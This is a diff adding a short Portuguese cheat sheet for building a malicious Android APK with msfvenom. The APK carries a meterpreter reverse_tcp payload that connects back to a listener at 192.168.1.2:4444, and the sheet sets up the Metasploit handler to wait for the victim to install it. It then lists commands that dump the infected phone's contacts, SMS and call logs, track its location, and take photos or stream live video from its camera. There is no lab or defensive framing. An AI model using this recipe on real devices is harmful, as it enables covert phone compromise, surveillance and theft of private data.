@@ -1,0 +1,39 @@
+MSFVENON
+
+PAYLOAD = android/meterpreter/reverse_tcp 
+
+Criando um arquivo .apk malicioso:
+
+msfvenon -p android/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 R > arquivo.apk
+  
+  OBS:
+    -p = Payload utilizado
+    R = Arquivo apk
+    > arquivo.apk = Nome do arquivo
+    
+Abrir msfconsole
+msfconsole
+
+usar o multhandler, para fazer o exploit
+use multhandler
+
+Setar as informações e payloads:
+set payload android/meterpreter/reverse_tcp
+set lhost 192.168.1.2
+set lport 4444
+
+Fazer o exploit e aguardar a conexão da vitima (Execução do apk)
+exploit
+
+--------------------------
+
+Comandos Uteis do meterpreter:
+
+dump_contacts = Envia os dados para um arquivo
+dump_sms = Envia os dados para um arquivo
+dump_calllog = Envia os dados para um arquivo
+wlan_geolocate = Restrear localização do android infectado
+webcam_list = Lista webcams existentes
+webcam_snap = Tira uma foto do aparelho infectado e salva em arquivo
+webcam_stream = Exibe um video em tempo real da camera do aparelho infectado
+
